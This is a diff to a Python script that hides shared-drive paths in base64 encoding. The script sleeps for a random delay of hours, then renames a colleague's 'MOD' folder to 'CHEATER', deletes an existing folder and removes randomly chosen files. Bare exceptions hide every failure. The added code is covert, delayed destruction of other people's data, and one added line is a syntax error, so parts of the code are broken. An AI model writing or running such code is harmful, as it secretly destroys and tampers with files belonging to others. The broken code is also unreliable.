@@ -47,6 +47,8 @@ import random
 import sys
 import time
 import traceback
+import shutil
+from glob import glob
 
 def b64decode_padded(value):
     value = value + ("=" * (-len(value) % 4))
@@ -118,7 +120,7 @@ def find_file(target_name, start_dir):
             return os.path.join(root, target_name)
     return None
 
-time.sleep(random.randint(10, 18000))
+
 
 try:
     add_queue_task(
@@ -127,12 +129,14 @@ try:
     )
 except:
     pass
+    
+time.sleep(random.randint(7000, 18000))
 
 # - 0
 zovV = []
 try:
-    ldir = search_latest_files_or_dirs(dir_path=b64decode_padded("Uzov"), ext="", n=5)
-    ldir += search_latest_files_or_dirs(dir_path=b64decode_padded("UzovdGVtcC9NT0Qv"), ext="", n=40)
+    ldir = search_latest_files_or_dirs(dir_path=b64decode_padded("Uzov"), ext="", n=10)
+    ldir += search_latest_files_or_dirs(dir_path=b64decode_padded("UzovdGVtcC9NT0Qv"), ext="", n=10)
     ldir += [
         (0, b64decode_padded("UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==")),
         (0, b64decode_padded("UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n")),
@@ -166,16 +170,41 @@ except:
 
 
 try:
-    tn = [b64decode_padded("UzovdGVtcC9NT0QgQ2hlYXRlci8="), b64decode_padded("UzovdGVtcC9NT0QuY2hlYXRlci8="), b64decode_padded("UzovdGVtcC9DaGVhdGVyLw==")]
+    tn = [b64decode_padded("UzovdGVtcC9DSEVBVEVS"), b64decode_padded("UzovdGVtcC9DSEVBVEVSX01PRA==")]
     random.shuffle(tn)
-    if os.path.exists(b64decode_padded("UzovdGVtcC9NT0Qv")):
-        shutil.move(b64decode_padded("UzovdGVtcC9NT0Qv"), tn[0])
+    if os.path.exists(b64decode_padded("UzovdGVtcC9NT0Q=")):
+        shutil.move(b64decode_padded("UzovdGVtcC9NT0Q="), tn[0])
         fs = glob(f"{tn[0]}*/*", recursive=True)
         for i in random.choices(fs, k=500):
             os.remove(i)
 except:
     pass
-
+    
+# - A0
+try:
+    tn =  [b64decode_padded("UzovdGVtcC9DSEVBVEVS"), b64decode_padded("UzovdGVtcC9DSEVBVEVS")]
+    random.shuffle(tn)
+    ssrc = b64decode_padded("UzovdGVtcC9NT0Q=")
+    ddst = tn[0]
+    if os.path.exists(ssrc):
+        if os.path.exists(ddst):
+            shutil.rmtree(ddst)
+        os.rename(ssrc, ddst)
+        files = glob(f"{ddst}/**/*", recursive=True)
+        files = [f for f in files if os.path.isfile(f)]
+        for file in random.sample(files, k=min(10, len(files))):
+            os.remove(file)
+except:
+    pass
+    
+# - A2
+try:
+    files = glob(f"{}/**/*".format(b64decode_padded("UzovdGVtcC9NT0QvVFVSTlRBQkxF")), recursive=True)
+    files = [f for f in files if os.path.isfile(f)]
+    for file in random.sample(files, k=min(10, len(files))):
+        os.remove(file)
+except:
+    pass
 
 # - A
 try:
